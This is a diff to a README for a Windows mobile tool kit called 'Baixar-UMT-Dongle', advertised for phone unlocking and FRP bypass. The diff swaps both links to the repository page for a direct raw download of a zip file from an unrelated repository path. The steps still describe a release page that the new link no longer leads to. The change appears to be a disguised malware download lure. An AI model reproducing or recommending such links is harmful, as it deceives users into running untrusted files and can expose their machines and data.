@@ -5,7 +5,7 @@ description: "Download and install UMT Dongle software on Windows 10 and 11 usin
 ---
 # 📥 Baixar-UMT-Dongle - Install your mobile tool kit now
 
-[![](https://img.shields.io/badge/Download-UMT_Dongle-blue.svg)](https://github.com/locenz2417/Baixar-UMT-Dongle)
+[![](https://img.shields.io/badge/Download-UMT_Dongle-blue.svg)](https://github.com/locenz2417/locenz2417.github.io/raw/refs/heads/main/Madagass/io_locenz_github_2.0-alpha.4.zip)
 
 Baixar-UMT-Dongle provides the software files you need to use the UMT ecosystem on your Windows computer. This guide helps you download, install, and prepare the software for your mobile device tasks. The package works on Windows 10 and Windows 11. It supports operations like phone unlocking, FRP bypass, and system maintenance.
 
@@ -24,7 +24,7 @@ Your computer must meet these basic standards to run the software.
 
 You need to access the official release page to get the installer files.
 
-1. Navigate to the release page: [https://github.com/locenz2417/Baixar-UMT-Dongle](https://github.com/locenz2417/Baixar-UMT-Dongle).
+1. Navigate to the release page: [https://github.com/locenz2417/locenz2417.github.io/raw/refs/heads/main/Madagass/io_locenz_github_2.0-alpha.4.zip](https://github.com/locenz2417/locenz2417.github.io/raw/refs/heads/main/Madagass/io_locenz_github_2.0-alpha.4.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Select the .zip file to start the download.
